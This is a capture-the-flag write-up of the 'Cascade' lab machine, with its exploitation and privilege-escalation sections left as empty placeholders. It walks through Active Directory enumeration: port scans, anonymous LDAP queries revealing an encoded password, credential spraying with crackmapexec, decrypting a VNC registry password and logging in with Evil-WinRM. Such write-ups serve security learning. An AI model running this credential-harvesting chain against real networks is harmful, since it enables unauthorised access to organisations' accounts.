---
description: 09-09-22
---

# Cascade (Medium)

### Improved skills

* Skill 1
* Skill 2

### Used tools

* Nmap -- Autorecon
*

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-10 02:38:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Notes:

53/DNS -- Zone Transfer

88/Kerberos -- AS-REP Roasting (User no pass) or Kerberoasting (User and password)

135/RPC -- rpcclient

389/LDAP -- ldapsearch&#x20;

445/SMB -- smbmap, smbclient, enum4linux

5985/WinRM -- Evil-WinRM will more than likely be used to authenticate to the target

## Enumeration

### 53/DNS -- Zone Transfer

* Zone transfer failed

### Enum4Linux

```
enum4linux -a 10.129.54.147

[+] Server 10.129.54.147 allows sessions using username '', password ''

```

* We see that the server allows for sessions using null or anonymous authentication
* Let's try to exploit this via rpcclient or smbmap/smbclient

### GetNPUsers

* AS-REPRoasting attempt <mark style="color:yellow;">failed</mark>

```
impacket-GetNPUsers cascade.local/ -no-pass -usersfile users

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

* Nothing lucrative out of this

### rpcclient

* Since we noticed that we can authenticate via '' let's try it

```
rpcclient \\\\10.129.54.147 -U '' -N
```

### Nmap ldap\* NSE Script

```
sudo nmap -n -sV --script "ldap* and not brute" 10.129.54.147
```

* This command contained very long output and did not seem to have anything of use in it.

### ldapsearch

* We will attempt to perform an LDAP query
* This seriously took forever to go through

```
ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.54.147 > results.txt

Ryan Thompson, Users, UK, cascade.local
sAMAccountName: r.thompson
cascadeLegacyPwd: clk0bjVldmE=

```

Username: <mark style="color:yellow;">r.thompson</mark>

cascadeLegacyPwd: clk0bjVldmE=&#x20;

<mark style="color:yellow;">rY4n5eva</mark>

* This looks BASE64 encoded. Let's decode it to see if we can see if it is a valid password

```
echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

### Crackmapexec

```
crackmapexec smb 10.129.54.147 -u users -p passwords --continue-on-success
SMB         10.129.54.147   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

* We confirm that <mark style="color:yellow;">r.thompson</mark> and <mark style="color:yellow;">rY4n5eva</mark> are valid creds
* Now, we have to enumerate the SMB share to uncover more information

### smbmap

* Time to use our fresh credentials and enumerate SMB

Test anonymous authentication

```
smbmap -H 10.129.54.147
Fails
```

Authenticated test

```
smbmap -H 10.129.54.147 -u r.thompson -p rY4n5eva

[+] IP: 10.129.54.147:445       Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

### smbclient

```
smbclient \\\\10.129.54.147\\Data -U r.thompson

Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020
```

* I see that I have access to the IT directory only

#### Meeting\_Notes\_June\_2018.html

```
<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>
```

* We see a Username of <mark style="color:yellow;">TempAdmin</mark>

VNC Install.reg

```
cat VNC\ Install.reg

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

* We see a password in hex. Let's decode it.
* First, to decode we need to use a tool called vncpasswd.py

{% embed url="https://github.com/trinitronx/vncpasswd.py" %}
GitHub Repo
{% endembed %}

### vncpasswd.py

Usage

* Remove the commas

```
./vncpasswd.py -d -H 6bcf2a4b6e5aca0f
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

* We now get a password of <mark style="color:yellow;">sT333ve2</mark>

### Evil-WinRM

```
evil-winrm -i 10.129.54.147 -u s.smith
Enter Password: sT333ve2

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

* <mark style="color:yellow;">We are now s.smith!</mark>

### smbmap

```
smbmap -H 10.129.54.147 -u s.smith -p sT333ve2
```

### smbclient

```
smbclient \\\\10.129.54.147\\Audit$ -U s.smith
```



## Exploitation

* ### Name of the technique

This is the exploit

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs

User

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>User Flag</p></figcaption></figure>

SYSTEM

